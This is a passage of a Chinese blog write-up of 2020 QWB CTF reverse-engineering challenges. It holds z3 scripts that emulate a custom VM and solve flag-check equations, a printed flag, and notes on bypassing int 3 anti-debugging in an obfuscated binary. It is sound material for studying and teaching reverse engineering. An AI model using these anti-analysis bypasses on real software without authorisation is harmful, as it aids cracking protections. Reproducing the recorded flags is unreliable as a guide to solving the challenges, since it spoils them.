class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x79</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x35</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">point=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    s=Solver()</span><br><span class="line">    var=[BitVec(<span class="string">&#x27;zzz&#x27;</span>,<span class="number">8</span>) ,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    tmp=var[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        op1=opcode[point]</span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x34</span> <span class="keyword">and</span> opcode[point+<span class="number">1</span>]==<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x34 0&quot;</span>) </span><br><span class="line">            s.add(var[<span class="number">0</span>] &gt;= <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">            s.add(var[<span class="number">0</span>]&lt;= <span class="built_in">ord</span>(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x34</span> <span class="keyword">and</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x34 1&quot;</span> ) <span class="comment"># 0x400AD0</span></span><br><span class="line">            var[opcode[point+<span class="number">1</span>]]=opcode[point+<span class="number">2</span>]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x3b</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x3b&quot;</span> )</span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]+=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]+=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x6e</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x6e&quot;</span>) </span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]^=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]^=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x3d</span>:   </span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x3d&quot;</span>) </span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]-=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]-=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x3a</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x3a&quot;</span> )</span><br><span class="line">            <span class="keyword">if</span> opcode[point+<span class="number">1</span>]!=<span class="number">0</span> <span class="keyword">and</span> opcode[point+<span class="number">2</span>]!=<span class="number">0</span>:</span><br><span class="line">                var[opcode[point+<span class="number">1</span>]]*=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var[<span class="number">0</span>]*=var[opcode[point+<span class="number">2</span>]]</span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> op1==<span class="number">0x4f</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;0x4f&quot;</span>) </span><br><span class="line">            s.add(var[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span> (s)</span><br><span class="line">            <span class="built_in">print</span> (s.check())</span><br><span class="line">            result = s.model()</span><br><span class="line">            flag += <span class="built_in">chr</span>(result[tmp].as_long().real)</span><br><span class="line">            <span class="comment">#print flag</span></span><br><span class="line">            point+=<span class="number">4</span></span><br><span class="line">            <span class="comment">#raw_input()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            raw_input()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;02a701b714a2746d218c223b1598b0f5&#125;</span></span><br></pre></td></tr></table></figure>

<p>感觉可以试试用pinctf，但是我没成功（可能是环境问题）</p>
<h1 id="2020-re-xx-warmup-obf"><a href="#2020-re-xx-warmup-obf" class="headerlink" title="2020 re xx_warmup_obf"></a>2020 re xx_warmup_obf</h1><p>这题就难在怎么去混淆然后进入验证逻辑分析，二进制里面有很多<code>int 3</code>指令,妨碍调试，运行完后就会进死循环。而且程序很多地方都不能反汇编，所以只能动调试试，遇到<code>int 3</code>指令就跳过，建议使用attach方法直接进入到输入flag的逻辑里面，不然一步步调到输入逻辑太麻烦。</p>
<style>.yoidbssyvrwk{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-2.png" class="yoidbssyvrwk" alt="img">

<p>比较flag长度的逻辑</p>
<style>.nimywzrwntco{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-3.png" class="nimywzrwntco" alt="img">

<p>第一个字符的检验逻辑  <code>flag[0]*5D75 == 253C9E</code> 很容易就能判断该字符为<code>f</code></p>
<style>.opjnotlovpjw{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-4.png" class="opjnotlovpjw" alt="img">

<p>第二个字符检验逻辑<code>flag[1]*44b38 + flag[0]*ffffe83</code>&#x3D;&#x3D; 1c4c7d2 </p>
<p>后面逻辑也差不多，第三个字符检验逻辑就是前三个字符一个方程，第四个就是前四个一个方程，也就是说一共28个方程式。可以把这些方程都罗列出来然后用z3求解。（其实看到这个flag检验逻辑是一个字符一个字符验证的，开始想的是可以直接用pinctf求解，但是尝试了一下只有前三个字符是能正常判断出来的，后面就乱了，可能每个字符验证错误后还需要走一段流程，这个流程比正确流程更长）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag = [Int(<span class="string">&quot;flag%d&quot;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>)]</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*<span class="number">23925</span> ) == <span class="number">2440350</span>)</span><br><span class="line">solver.add( (flag[<span class="number">1</span>]*<span class="number">281400</span> + flag[<span class="number">0</span>]*-<span class="number">7037</span> ) == <span class="number">29673426</span>)</span><br><span class="line">solver.add( (flag[<span class="number">2</span>]*-<span class="number">255300</span> + flag[<span class="number">0</span>]*<span class="number">174826</span> + flag[<span class="number">1</span>]*-<span class="number">283573</span> ) == -<span class="number">37557732</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*-<span class="number">276718</span> + flag[<span class="number">1</span>]*-<span class="number">98445</span> + flag[<span class="number">2</span>]*<span class="number">259881</span> + flag[<span class="number">3</span>]*<span class="number">4524</span> ) == -<span class="number">13182867</span>)</span><br><span class="line">solver.add( (flag[<span class="number">4</span>]*-<span class="number">228216</span> + flag[<span class="number">0</span>]*<span class="number">94721</span> + flag[<span class="number">3</span>]*-<span class="number">274569</span> + flag[<span class="number">2</span>]*<span class="number">285576</span> + flag[<span class="number">1</span>]*-<span class="number">60353</span> ) == -<span class="number">25506885</span>)</span><br><span class="line">solver.add( (flag[<span class="number">5</span>]*<span class="number">125853</span> + flag[<span class="number">2</span>]*<span class="number">264844</span> + flag[<span class="number">4</span>]*-<span class="number">294195</span> + flag[<span class="number">1</span>]*-<span class="number">5496</span> + flag[<span class="number">3</span>]*<span class="number">260927</span> + flag[<span class="number">0</span>]*-<span class="number">153661</span> ) == <span class="number">13075233</span>)</span><br><span class="line">solver.add( (flag[<span class="number">6</span>]*-<span class="number">190371</span> + flag[<span class="number">5</span>]*-<span class="number">130259</span> + flag[<span class="number">2</span>]*-<span class="number">244086</span> + flag[<span class="number">1</span>]*-<span class="number">244952</span> + flag[<span class="number">3</span>]*-<span class="number">258397</span> + flag[<span class="number">0</span>]*<span class="number">17630</span> + flag[<span class="number">4</span>]*-<span class="number">109961</span> ) == -<span class="number">111027477</span>)</span><br><span class="line">solver.add( (flag[<span class="number">0</span>]*<span class="number">228408</span> + flag[<span class="number">3</span>]*-<span class="number">6727</span> + flag[<span class="number">6</span>]*<span class="number">218992</span> + flag[<span class="number">2</span>]*<span class="number">18513</span> + flag[<span class="number">1</span>]*-<span class="number">198175</span> + flag[<span class="number">7</span>]*<span class="number">268397</span> + flag[<span class="number">5</span>]*<span class="number">117817</span> + flag[<span class="number">4</span>]*<span class="number">224658</span> ) == <span class="number">78775012</span>)</span><br><span class="line">solver.add( (flag[<span class="number">5</span>]*<span class="number">52068</span> + flag[<span class="number">8</span>]*<span class="number">92684</span> + flag[<span class="number">1</span>]*-<span class="number">84462</span> + flag[<span class="number">4</span>]*<span class="number">190784</span> + flag[<span class="number">2</span>]*<span class="number">77982</span> + flag[<span class="number">0</span>]*-<span class="number">236774</span> + flag[<span class="number">7</span>]*-<span class="number">218493</span> + flag[<span class="number">3</span>]*-<span class="number">288418</span> + flag[<span class="number">6</span>]*-<span class="number">243023</span> ) == -<span class="number">52520267</span>)</span><br><span class="line">solver.add( (flag[<span 